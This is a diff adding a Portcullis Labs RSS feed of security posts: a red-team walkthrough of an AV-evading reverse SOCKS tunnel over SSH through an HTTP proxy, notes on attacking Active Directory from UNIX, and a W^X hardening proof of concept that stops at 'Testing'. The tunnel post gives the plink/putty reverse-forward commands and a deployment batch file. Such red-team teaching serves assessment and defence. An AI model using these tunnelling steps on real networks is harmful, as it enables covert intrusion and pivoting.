@@ -1,0 +1,1246 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Portcullis Labs &#187; Windows</title>
+	<atom:link href="https://labs.portcullis.co.uk/tag/windows/feed/" rel="self" type="application/rss+xml" />
+	<link>https://labs.portcullis.co.uk</link>
+	<description>Research and Development</description>
+	<language>en-US</language>
+		<sy:updatePeriod>hourly</sy:updatePeriod>
+		<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.8.5</generator>
+	<item>
+		<title>Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</title>
+		<link>https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/</link>
+		<comments>https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/#comments</comments>
+		<pubDate>Fri, 25 Jan 2019 11:36:11 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[RDP]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6813</guid>
+		<description><![CDATA[<p>In the context of a Red Team assessment, in this post I&#8217;ll look at some options for using SOCKS to gain external access to an internal network. I&#8217;ll cover the obvious methods and why I&#8217;m overlooking them, a crude method using standard tools (this post) and a more refined approach using modified tools (in part 2). [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In the context of a Red Team assessment, in this post I&#8217;ll look at some options for using SOCKS to gain external access to an internal network. I&#8217;ll cover the obvious methods and why I&#8217;m overlooking them, a crude method using standard tools (this post) and a more refined approach using modified tools (in part 2).<span id="more-6813"></span></p>
+<p>I recently spent quite a long time preparing for the <a title="CREST Certified Simulated Attack Specialist" href="https://www.crest-approved.org/examination/certified-simulated-attack-specialist/index.html">CREST Certified Simulated Attack Specialist</a> exam. While I won&#8217;t be discussing exam content (which I&#8217;m under NDA for), I thought it could be beneficial to write up at least some of the interesting stuff that I prepared prior to sitting the exam.</p>
+<p>I spent a lot of time testing my tools and techniques against 5 different Anti-Virus (AV) products. I wanted to be sure that I had enough options available to me during the exam to operate efficiently, even if AV was present.  One scenario that I wanted to be prepared for was:</p>
+<ul>
+<li>Having a foothold (command execution) on a <em>Windows </em>system in an internal network; but</li>
+<li>being unable to deploy my normal C2 software (<a title="Cobalt Strike" href="https://www.cobaltstrike.com/">Cobalt Strike</a> / <a title="Meterpreter" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/">Meterpreter</a>) due to Anti-Virus / Endpoint Protection.</li>
+</ul>
+<p>My practice had shown that I was able to deploy my C2 software of choice onto only 4 out 5 test systems. So this seemed like something I needed to prepare for. Just in case.</p>
+<p>In parallel with this, I&#8217;d found that performance of SOCKS over a reverse HTTPS connection was barely adequate for tunneling an RDP connection. So I was interested in finding a solution that was:</p>
+<ul>
+<li>Faster</li>
+<li>Worked through a proxy; and</li>
+<li>Worked in the presence of my nemesis AV product</li>
+</ul>
+<p>My instinct was to try to SSH out of the network and use the SOCKS proxy built into SSH.  There were a few problems with this approach:</p>
+<ol>
+<li>I needed an SSH client &#8211; which I could solve by using <a title="Putty" href="https://www.putty.org/">Putty</a> (read on for the reason I didn&#8217;t use plink)</li>
+<li>I needed to get an SSH connection out of the network &#8211; which could probably do via the proxy using <a title="HTTP CONNECT" href="https://en.wikipedia.org/wiki/HTTP_tunnel">HTTP CONNECT</a> in the same way used for legitimate TLS connections</li>
+<li>SSH allows SSH clients to send traffic through a SOCKS proxy running on the SSH server. This was the opposite to what I needed. I needed the SSH server (on the &#8220;internet&#8221;) to be able to access a SOCKS Proxy running on the SSH Client. Which is a Windows box in this scenario. If the compromised host had been a *NIX host, I could potentially have SSH&#8217;d to localhost with the -D option to get the SOCKS server running, then made a second connection to the Internet to port-forward access to the SOCKS service</li>
+</ol>
+<div id="attachment_6823" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6814"><div class="lb-album"><a href="#image-6814"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/protocol-flow-300x191.png" alt="Communication Flow between Devices" class="size-medium wp-image-6823"><span></span></a></div>              
+<a href="#imageclose-6814" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6814">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/protocol-flow.png" alt="image-6814">
+                   </div></a><p class="wp-caption-text">Communication flow between devices</p></div>
+<h2>Solving (3): SOCKS server</h2>
+<p>To solve (3) I looked for a small command line SOCKS proxy that ran on Windows. I did find some, but they all felt a bit dodgy and some said on their website that they definitely weren&#8217;t malware, despite what AV products said. Which is probably true, but it made them a poor option if I wanted to operate in the presence of AV.</p>
+<p>Eventually I stumbled on a <a title="SOCKS5 implementation written in golang" href="https://github.com/armon/go-socks5">SOCKS5 implementation written in golang</a> written by <a title="Armon Dagar" href="https://github.com/armon">Armon Dagar</a>. I&#8217;d heard that golang malware would be on the rise in 2019, so this was a good opportunity for me to waste valuable revision time on a side-interest. I&#8217;d never even compiled a golan program before. If this wasn&#8217;t too hard, it would be a nice cross-platform solution for my needs.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ mkdir -p ~/go/src
+$ cd !$
+$ git clone https://github.com/armon/go-socks5
+$ mv go-socks5 socks5
+$ cd socks5
+$ go build
+</pre>
+<p>No errors <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<p>But no server either. This is just a library! You need to write some code to use it. <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_sad.gif" alt=":-(" class="wp-smiley" /> </p>
+<p>Fortunately, the author provides an example that&#8217;s easily adapted:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+mkdir -p ~/go/src/mysocks5
+cd !$
+$ cat &lt;&lt; EOF &gt; mysocks.go
+// Create a SOCKS5 server
+package main
+import &quot;socks5&quot;
+
+func main() {
+  conf := &amp;socks5.Config{}
+  server, err := socks5.New(conf)
+  if err != nil {
+    panic(err)
+  }
+
+  // Create SOCKS5 proxy on localhost port 1080
+  if err := server.ListenAndServe(&quot;tcp&quot;, &quot;127.0.0.1:1080&quot;); err != nil {
+    panic(err)
+  }
+}
+EOF
+go build
+</pre>
+<p>Done! I now had a &#8220;mysocks5&#8243; executable. And it worked. Repeating similar steps on Windows gave me a working mysocks5.exe. I was starting to like golang at this point.</p>
+<h2>Solving (1): Putty configuration</h2>
+<p>After getting almost to the finish line with the following plink command, I couldn&#8217;t specify an HTTP proxy from the command line:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+plink -N -P 443 -i puttykey.priv.ppk -R 2080:127.0.0.1:1080 -hostkey db:b0:69:08:20:b1:61:2d:da:f4:e2:d8:0f:b8:71:9a tunnnel@192.168.0.1
+</pre>
+<p>A quick overview of options here:</p>
+<ul>
+<li>-N: &#8211; I don&#8217;t need a shell, just an SSH connection for port forwarding</li>
+<li>-P 443 &#8211; Target port 443, not 22 since the proxy is likely to restrict us in this way</li>
+<li>-i puttykey.priv.ppk &#8211; The private key to access my listening SSH server, I needed logon to be non-interactive, obviously</li>
+<li>-R 2080:127.0.0.1:1080 &#8211; Open a listening port (2080) on the SSH server and forward connections to that port to 127.0.0.1:1080 on the SSH client</li>
+<li>-hostkey db:b0:69:08:20:b1:61:2d:da:f4:e2:d8:0f:b8:71:9a &#8211; We don&#8217;t want any warnings or questions about unverified host keys</li>
+<li>tunnnel@192.168.0.1 &#8211; Log into 192.168.0.1 as user tunnel</li>
+</ul>
+<p>Using the normal putty.exe GUI, I saved a session that specified all of the above detail, plus the required proxy settings (unauthenticated in the case of my lab):</p>
+<div id="attachment_6822" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6815"><div class="lb-album"><a href="#image-6815"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/putty-proxy-300x282.png" alt="Proxy Settings for SSH Connection in Putty" class="size-medium wp-image-6822"><span></span></a></div>              
+<a href="#imageclose-6815" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6815">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/putty-proxy.png" alt="image-6815">
+                   </div></a><p class="wp-caption-text">Proxy settings for SSH connection in Putty</p></div>
+<p>I saved a putty session called myproxy, then retried plink:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+plink -load myproxy
+</pre>
+<p>It crashed. Hence, why I&#8217;m not using plink.  Putty works fine, though:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+putty -load myproxy
+</pre>
+<p>Well, sort of fine. The victim user would have a suspicious-looking putty window pop up alongside the mysocks console window. But this is just a PoC. Let&#8217;s ignore these missing optimisations!</p>
+<div id="attachment_6830" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6816"><div class="lb-album"><a href="#image-6816"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/user-prespective-300x110.png" alt="How the attack looks from user' class="size-medium wp-image-6830"><span></span></a></div>              
+<a href="#imageclose-6816" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6816">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/user-prespective.png" alt="image-6816">
+                   </div></a><p class="wp-caption-text">How the attack looks from user&#8217;s perspective</p></div>
+<p>On the server-side, we see a network listener on port 2080.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+tcp 0 0 0.0.0.0:2080 0.0.0.0:* LISTEN
+</pre>
+<p>I wanted the service bound to 0.0.0.0 for my environment, but consider that anyone with network access could abuse your SOCKS proxy.</p>
+<p>This provides a relatively high-performance SOCKS server &#8211; much better than those laggy SOCKS-over-reverse-HTTPS connections. Implants typically poll periodically over HTTPS, which means that traffic can only be sent when the implant calls home. The above method is more akin to SOCKS-over-reverse-TCP. Data can be sent in either direction immediately without waiting for a check-in. Arguably, the above method will create a more suspicious traffic pattern and some application-layer aware proxies won&#8217;t allow it (though tunneling over SSL could help).</p>
+<h2>Packaging it up</h2>
+<p>To deliver above attack, we need to package up the software and configuration so it can be run from the command line. We&#8217;ll assume that we can upload and unpack zip files for this part (or the post will get too long). I included the following in myproxy.zip:</p>
+<ul>
+<li>putty.exe</li>
+<li>mysocks5.exe</li>
+<li>myproxy.reg &#8211; Created by doing &#8220;reg export HKCU\Software\SimonTatham myproxy.reg&#8221;, then removing unnecessary configuration data in a text editor</li>
+<li>puttykey.priv.ppk &#8211; Created using puttygen, be sure to copy the openssh-format public key into ~tunnel/.ssh/authorized_key on the SSH server too</li>
+<li>mysocks.bat &#8211; See below</li>
+</ul>
+<p>To deploy, we need to run mysocks.bat, which does the following:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+reg import myproxy.reg
+start mysocks5
+putty -load myproxy
+</pre>
+<p>All finished. We can pivot through our fast SOCKS proxy. For example, to access RDP on the internal network, I&#8217;d do something like:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ cat /etc/proxychains.conf
+...
+socks5  127.0.0.1 2080
+$ proxychains remmina
+</pre>
+<p>Where <a title="remmina" href="https://remmina.org/">remmina</a> is a pretty awesome RDP client for Linux. You can also use <a title="proxifier" href="https://www.proxifier.com/">proxifier</a> on Windows if you&#8217;d rather use mstsc.exe.</p>
+<h2>Conclusion</h2>
+<p>We showed a PoC to get a reverse SOCKS connection out of a network using tools that won&#8217;t trigger AV. They don&#8217;t require privileges run, so would work against an unprivileged windows user. The connection is faster than if we&#8217;d used the SOCKS features of C2 solutions that use polling reverse-HTTPS connections.</p>
+<p>Our attack is untidy because the user can see everything that happens! It&#8217;s also awkward to set up because of the registry export and required packaging.</p>
+<h2>Further Reading</h2>
+<ul>
+<li><a title="Chisel" href="https://github.com/jpillora/chisel">Chisel</a> is a tool that can create a SOCKS-over-SSH-over-CONNECT-HTTP tunnel in the opposite direction the direction I needed</li>
+<li><a title="Crowbar" href="https://github.com/q3k/crowbar">Crowbar</a> is a tool that lets you do port forwarding over HTTP channels (no reliance on the proxy CONNECT method)</li>
+</ul>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>An offensive introduction to Active Directory on UNIX</title>
+		<link>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/</link>
+		<comments>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/#comments</comments>
+		<pubDate>Thu, 06 Dec 2018 09:18:36 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[Black Hat Europe]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[conference]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[hardening]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[UNIX]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6805</guid>
+		<description><![CDATA[<p>By way of an introduction to our talk at Black Hat Europe, Security Advisory EMEAR would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests. Background to Active Directory integration [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>By way of an introduction to <a href="https://www.blackhat.com/eu-18/briefings/schedule/index.html#where-2-worlds-collide-bringing-mimikatz-et-al-to-unix-12962" title="our talk">our talk</a> at Black Hat Europe, <a href="https://www.cisco.com/c/en/us/products/security/advisory-services.html" title="Security Advisory EMEAR">Security Advisory EMEAR</a> would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests.<span id="more-6805"></span></p>
+<h2>Background to Active Directory integration solutions</h2>
+<p>Having seen an uptick in unique UNIX infrastructures that are integrated into customers&#8217; existing Active Directory forests, the question becomes, &#8220;Does this present any concerns that may not be well understood?&#8221; This quickly became &#8220;What if an adversary could get into a UNIX box and then breach your domain?&#8221;<br />
+Within a typical Active Directory integration solution (in this case <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/5.7_release_notes/sssd" title="SSSD">SSSD</a>), the solution shares a striking similarity to what a user might see on Windows. Notably, you have:</p>
+<ul>
+<li>DNS &#8211; Used for name resolution</li>
+<li>LDAP &#8211; Used for &#8220;one-time identification&#8221; and assertion of identity</li>
+<li>Kerberos &#8211; Used for ongoing authentication</li>
+<li>SSSD &#8211; Like LSASS</li>
+<li>PAM &#8211; Like msgina.dll or the more modern credential providers</li>
+</ul>
+<p>You can see a breakdown of this process <a title="here" href="https://rhelblog.redhat.com/2015/02/04/overview-of-direct-integration-options/">here</a>. Unlike Windows, there is no Group Policy for the most part (with some exceptions), so policies for sudo et al. are typically pushed as flat files to hosts.</p>
+<h2>Our research</h2>
+<p>Realistically, the threat models associated with each part of the implementation should be quite familiar to anyone securing a heterogeneous Windows network. Having worked with a variety of customers, it becomes apparent that the typical UNIX administrator who does not have a strong background in Windows and Active Directory will be ill-equipped to handle this threat. While we&#8217;ve been talking about successful attacks against components such as LSASS and Kerberos for quite some time, Mimikatz dates back to at least April 2014, and dumping hashes has been around even longer. Pwdump, which dumped local Windows hashes, was published by Jeremy Allison in 1997). However, no one has really taken a concerted look at whether these attacks are possible on UNIX infrastructure, nor how a blue team might spot an adversary performing them.</p>
+<p>As a result of this research, we were able to develop tactics, tools, and procedures that might further assist an attacker in breaching an enterprise, and we began documenting and developing appropriate strategies to allow blue teams to appropriately detect and respond to such incursions. The Black Hat EU slides can be found <a title="here" href="/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">here</a> and whilst the tools we developed can be found on <a href="https://github.com/portcullislabs/linikatz" title="our GitHub repo">our GitHub repo</a>.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Where 2 worlds collide: Bringing Mimikatz et al to UNIX</title>
+		<link>https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/</link>
+		<comments>https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/#comments</comments>
+		<pubDate>Thu, 06 Dec 2018 08:04:06 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Presentations]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[Black Hat Europe]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[conference]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[hardening]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[UNIX]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6806</guid>
+		<description><![CDATA[<p>Presentation on Active Directory integration solutions for UNIX (as given at Black Hat Europe 2018). Over the past fifteen years there&#8217;s been an uptick in &#8220;interesting&#8221; UNIX infrastructures being integrated into customers&#8217; existing AD forests. Whilst the threat models enabled by this should be quite familiar to anyone securing a heterogeneous Windows network, they may [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">Where 2 worlds collide: Bringing Mimikatz et al to UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Presentation on Active Directory integration solutions for UNIX (as given at Black Hat Europe 2018).<span id="more-6806"></span></p>
+<p>Over the past fifteen years there&#8217;s been an uptick in &#8220;interesting&#8221; UNIX infrastructures being integrated into customers&#8217; existing AD forests. Whilst the threat models enabled by this should be quite familiar to anyone securing a heterogeneous Windows network, they may not be as well understood by a typical UNIX admin who does not have a strong background in Windows and AD. Over the last few months we&#8217;ve spent some time looking a number of specific Active Directory integration solutions (both open and closed source) for UNIX systems and documenting some of the tools, tactics and procedures that enable attacks on the forest to be staged from UNIX.</p>
+<p>This talk describes the technical details regarding our findings. It includes Proof of Concepts (PoC) showing real-world attacks against AD joined UNIX systems. Finally, potential solutions or mitigation controls are discussed that will help to either prevent those attacks or at the very least to detect them when they occur.</p>
+<p>Tools referenced in this talk include:</p>
+<ul>
+<li><a href="https://github.com/portcullislabs/linikatz" title="Linikatz">Linikatz</a></li>
+<ul>
+<li><a href="https://github.com/portcullislabs/linikatz/tree/master/red/JohnTheRipper" title="JohnTheRipper dynamic.conf rules">JohnTheRipper dynamic.conf rules</a></li>
+<li><a href="https://github.com/portcullislabs/linikatz/tree/master/red/metasploit-framework" title="metasploit-framework post-exploitation modules">metasploit-framework post-exploitation modules</a></li>
+<li><a href="https://github.com/portcullislabs/linikatz/tree/master/blue/audit" title="auditd policies">auditd policies</a></li>
+<li><a href="https://github.com/portcullislabs/linikatz/tree/master/tools/vas/fuzzers" title="fuzzers">fuzzers</a></li>
+</ul>
+</ul>
+<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-1').click();">
+  <div class="icon"><a href="https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" target="_blank" title="Download Eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/document.png" alt="Eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX" /></a></div>
+  <div class="filetitle">
+    <a href="https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" title="Download eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" target="_blank" id="wpfb-file-link-1">eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf</a>
+    
+    <br />
+    December 6, 2018<br />
+    
+  </div>
+  <div class="info">
+    724.9 KiB<br />
+    MD5 hash: cc712c5e46b16fbff22a2566b1248a91 <br />
+    <a href="#" onclick="return wpfilebase_filedetails(1);">Details</a>
+  </div>
+  <div class="details" id="wpfilebase-filedetails1" style="display: none;">
+  
+  <table border="0">
+   
+   
+   
+   
+   
+   
+   <tr><td><strong>Date:</strong></td><td>December 6, 2018</td></tr>
+  </table>
+  </div>
+ <div style="clear: both;"></div>
+</div>
+<p>The post <a href="https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">Where 2 worlds collide: Bringing Mimikatz et al to UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Enforcing a write-xor-execute memory policy from usermode</title>
+		<link>https://labs.portcullis.co.uk/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/</link>
+		<comments>https://labs.portcullis.co.uk/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/#comments</comments>
+		<pubDate>Fri, 02 Feb 2018 02:21:20 +0000</pubDate>
+		<dc:creator><![CDATA[GCS]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[hardening]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6399</guid>
+		<description><![CDATA[<p>If BuzzFeed ran an article titled &#8220;26 Security Features You Probably Shouldn&#8217;t Enforce From Usermode&#8221;, this one would almost certainly make the list. But, for whatever reason, I thought it would be a fun learning experience to try to enforce a W^X memory policy from usermode. Some of you are probably asking what the heck [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/">Enforcing a write-xor-execute memory policy from usermode</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>If BuzzFeed ran an article titled &#8220;26 Security Features You Probably Shouldn&#8217;t Enforce From Usermode&#8221;, this one would almost certainly make the list. But, for whatever reason, I thought it would be a fun learning experience to try to enforce a W^X memory policy from usermode. Some of you are probably asking what the heck a W^X policy is in the first place, and I&#8217;m terrible at thinking of ways to start blog posts (case in point: this paragraph), so I guess we&#8217;ll start out there.<span id="more-6399"></span></p>
+<h2>What&#8217;s a W^X policy, anyway?</h2>
+<p>W^X is an exploit mitigation tactic in which memory pages that are, or have ever been, marked as writable can never be marked as executable during the process lifetime. The old exploit tactic of putting your exploit payload on the stack (or heap) and calling it directly was killed off with no-execute (NX, also known as hardware DEP on Windows) support, which made ret2libc/ROP approaches much more popular. ROP involves finding small pieces of existing executable code in the application and its libraries, chaining them together using the stack, with the goal of calling an API or two to allocate some executable memory for the payload to be copied into. On Windows this is usually done with a ROP chain to the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887.aspx" title="VirtualAlloc">VirtualAlloc</a>() API, passing <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786.aspx" title="PAGE_EXECUTE_READWRITE">PAGE_EXECUTE_READWRITE</a>() in order to allow for both writing the data in and executing it afterwards.</p>
+<p>Enforcing a W^X policy breaks this approach, as an exploit cannot allocate memory as RWX, or as RW and then later executable. Applications in Windows 8.1 and later can opt into a W^X policy, enforced by the kernel, this using the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088.aspx" title="SetProcessMitigationPolicy">SetProcessMitigationPolicy</a>() API with the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/mt706243.aspx" title="ProcessDynamicCodePolicy">ProcessDynamicCodePolicy</a>() argument. Of course, this is also the boring way (at least for this article).</p>
+<h2>The small print</h2>
+<p>I&#8217;m not going to make you read a sixty-eight page EULA and sign your life away on the dotted line, but there are things you should know before you gallivant away with some source code and a dream of securing your applications:</p>
+<ol>
+<li>I am a terrible C++ programmer. You should absolutely not use my code in production</li>
+<li>This is a proof-of-concept, so you still absolutely should not use it in production. And probably not any other context than &#8220;I want to learn how this works&#8221; or &#8220;I want to torture my eyes by reading wonky code&#8221;</li>
+<li>While some effort has been made to make the PoC thread-safe, there are some race conditions (probably security-critical ones) that exist and I haven&#8217;t done anything to fix for reasons of keeping the code fairly simple</li>
+<li>Only VirtualAlloc(), VirtualProtect(), and VirtualFree() are hooked. There are ways to get around this (e.g. calling `ntdll` functions directly, or using `Ex` suffix variants) so, again, don&#8217;t expect any concrete security from this</li>
+<li>In case you didn&#8217;t already get the memo, implementing this kind of security feature from usermode is colossally silly, particularly when the OS offers a proper version that is enforced in the kernel. An attacker who expects this usermode &#8220;protection&#8221; can tailor their exploit to bypass it in most cases
+</li>
+<li>Just like the kernelmode version, this breaks any application that uses JIT compilation. So that means all browsers, anything that uses Java, .NET, or a modern JavaScript engine. It also means things that embed a web frame</li>
+</ol>
+<p>Caveat emptor, and all that.</p>
+<h2>How does this thing work?</h2>
+<p>The actual approach is fairly simple:</p>
+<ol>
+<li>Hook APIs</li>
+<li>Reject calls that would result in a page being writable and executable at the same time</li>
+<li>Track calls that result in a page being writable, and deny future calls that would make those pages executable</li>
+</ol>
+<p>The grunt work involved with hooking APIs is fairly boring, so I enlisted the help of the <a href="https://github.com/martona/mhook" title="mhook library">mhook library</a> by Marton Anka. This library provides a really intuitive way of hooking APIs:</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">
+Mhook_SetHook((PVOID*)&amp;OriginalVirtualAlloc,   HookedVirtualAlloc);
+Mhook_SetHook((PVOID*)&amp;OriginalVirtualProtect, HookedVirtualProtect);
+Mhook_SetHook((PVOID*)&amp;OriginalVirtualFree,    HookedVirtualFree);
+</pre>
+<p>Each call to Mhook_SetHook() takes a pointer to the original API as the first parameter, and a pointer to the hooked version you want to replace it with.</p>
+<h3>VirtualAlloc hook</h3>
+<p>The VirtualAlloc hook checks if flProtect is either PAGE_EXECUTE_READWRITE or PAGE_EXECUTE_WRITECOPY. The former is the general-case RWX protection, and the latter is used when the segment of memory is a memory-mapped file. If either of these protection options are detected, the operation is failed with an access denied error.</p>
+<p>Next, we perform the requested VirtualAlloc() call via OriginalVirtualAlloc. If this succeeds, we check to see if the requested allocation contained a writable flag (e.g. PAGE_READWRITE or PAGE_WRITECOPY) and, if so, add that allocation&#8217;s page address and allocation size to a tracking list. This allows us to later reject requests  to make these pages executable, as they have been tainted with the writable mark.</p>
+<h3>VirtualProtect hook</h3>
+<p>The VirtualProtect hook is the most involved. As with VirtualAlloc it first rejects RWX protections outright. It then checks to see if the requested protection is executable and, if so, checks if the page exists within the boundary of a tracked writable allocation, i.e. if it starts within one, ends within one, or starts before and ends after one. This prevents tricks like allocating a small chunk of writable memory inside a larger readonly block, then calling VirtualProtect() over the whole block to make it all executable.</p>
+<p>In order to protect against abuse of writable memory that was pre-allocated by the loader (e.g. the .data section) the code also calls VirtualQuery() to test the existing protection status of the memory, just in case we aren&#8217;t tracking it.</p>
+<p>Another case we need to handle is similar to the VirtualAlloc() call. If the call is making memory writable, we need to track it. First we check if the exact allocation is already present in our tracked list, then if it isn&#8217;t we add it. It doesn&#8217;t matter if we have overlapping tracking metadata for writable allocations &#8211; we handle this case in our hooked VirtualFree(). Speaking of which&#8230;</p>
+<h3>VirtualFree hook</h3>
+<p>This hook is fairly simple. We just iterate over every item in the tracked allocations and remove them if they cover the address being freed.</p>
+<h2>Testing</h2>
